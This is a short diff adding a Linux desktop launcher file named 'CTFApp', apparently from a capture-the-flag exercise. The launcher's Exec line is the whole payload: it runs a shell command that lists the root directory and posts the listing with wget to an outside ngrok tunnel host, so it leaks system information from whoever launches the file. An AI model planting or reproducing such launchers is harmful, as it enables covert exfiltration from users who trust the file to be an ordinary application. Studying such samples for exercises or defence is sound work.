@@ -1,0 +1,4 @@
+[Desktop Entry]
+Exec=sh -c "wget --post-data=\"$(ls /)\" https://sway-washcloth-respect.ngrok-free.dev"
+Type=Application
+Name=CTFApp
